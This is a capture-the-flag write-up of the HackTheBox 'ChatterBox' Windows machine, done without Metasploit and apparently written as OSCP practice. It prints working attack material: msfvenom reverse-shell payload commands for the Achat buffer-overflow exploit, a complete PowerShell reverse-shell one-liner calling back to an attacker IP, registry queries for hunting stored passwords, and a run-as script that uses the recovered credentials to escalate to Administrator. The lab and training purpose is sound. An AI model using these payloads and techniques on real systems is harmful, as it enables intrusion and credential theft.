---
title: ChatterBox Writeup | Without Metasploit
date: 2021-09-04
categories: [WriteUp, HackTheBox]
tags: [HackTheBox, WriteUp, OSCP, TJNULLs List] 
---

----
IP : Dynamic (HTB VIP+)
OS : Windows 
Difficulty : Medium

Covered Issues : BufferOverflow, Powershell, Windows PrivEsc

Tools Used : rustscan, searchsploit, python, msfvenom, nc, socat, powershell, 

Remediation Advise : 
	
----
----

#### Enumeration
 
**`rustscan`**
```powershell
$ rustscan -a 10.129.216.176 -b 1500 --ulimit 5000 -- -A | tee rustscanChatterbox
```
![alt](/assets/Images_P2_ChatterBox/ChatterBox_1.png)


Detailed Enumeration with **`nmap`**.
```powershell
# Found ports from rustscan were UDP ports.
nmap -Pn -A -p 9255,9256 10.129.216.119 | tee nmapA
```
![alt](/assets/Images_P2_ChatterBox/ChatterBox_2.png)

Searching for exploit in **`searchsploit`** DB.
```powershell
$ searchsploit "achat"
Achat 0.150 beta7 - Remote Buffer Overflow | windows/remote/36025.py
```

![alt](/assets/Images_P2_ChatterBox/ChatterBox_3.png)

----
----

#### Weaponizing Exploitation Tool

Going forward with searchsploit suggested exploit. `windows/remote/36025.py`
Generating new buffer payload with **`msfvenom`** for exploit  with instructions given in exploit.
```bash
$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```
![alt](/assets/Images_P2_ChatterBox/ChatterBox_4.png)

----
----
#### Exploitation

Modifying the exploit code. Putting new Buffer payload and change target ip.
Starting **`nc`** listener to catch reverse shell.
```bash
$ rlwrap nc -lvnp 4444
```

```bash
$ python 36025.py
```
![alt](/assets/Images_P2_ChatterBox/ChatterBox_5.png)


Upgrading the cmd shell to powershell.
```bash
# start socat listener
$ rlwrap socat -d -d TCP4-LISTEN:5555,fork STDOUT
```

```powershell
# In recived windows rev shell enter this command.
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.17.81',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

![alt](/assets/Images_P2_ChatterBox/ChatterBox_6.png)

***It will give better powershell reverse shell. Now we can proceed with priv esc.***

----
----

#### Privilege Escalation
- Enumeration for PrivEsc
	- whoami : alfred (low level user)
	- systeminfo :
		- OS Name : Microsoft Windows 7 Professional
		- OS Version: 6.1.7601 Service Pack 1 Build 7601
		- Hotfix: 183 Hotfix(s) Installed.
		- Kernal Exploits : N/A

**Mannual Enumeration**

```powershell
# password hunting
# Search for passwords in registry
> reg query HKLM /f password /t REG_SZ /s
> reg query HKCU /f password /t REG_SZ /s

# Windows autologin
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

**From above enumeration we got default username & password stored in registry.**
`Alfred : Welcome1!`

Same can be achieved with `powerup` or `winpeas`.

![alt](/assets/Images_P2_ChatterBox/ChatterBox_7.png)

Running program as other user. We can escalate privileges.
```powershell
function Invoke-CreatingPassword
{
$Pass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CHATTERBOX\Alfred',$Pass)
Start-Process -FilePath "powershell" -ArgumentList "whoami" -Credential $Cred	
}

Invoke-CreatingPassword
```
Testing with whoami with 'Alfred user'
![alt](/assets/Images_P2_ChatterBox/ChatterBox_8.png)

Now changing the username `Administrator` instead of `Alfred`.
![alt](/assets/Images_P2_ChatterBox/ChatterBox_9.png)

With the above powershell script we are able to run **`whoami`** program in Windows.
![alt](/assets/Images_P2_ChatterBox/ChatterBox_10.png)

Now, We can also get reverse shell with the help of msfvenom payload.
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=7777 -f exe -o shell.exe
```
Host it on using http server. And transfer it to windows machine.

![alt](/assets/Images_P2_ChatterBox/ChatterBox_11.png)
![alt](/assets/Images_P2_ChatterBox/ChatterBox_12.png)

Modifying the run-as powershell script.
![alt](/assets/Images_P2_ChatterBox/ChatterBox_13.png)

After transferring, setting up listener.

```bash
$ rlwrap socat -d -d TCP4-LISTEN:7777,fork STDOUT
```

and calling the modified run-as powershell script developed above.
we will be able to get reverse shell with admin privileges.

![alt](/assets/Images_P2_ChatterBox/ChatterBox_14.png)

----
----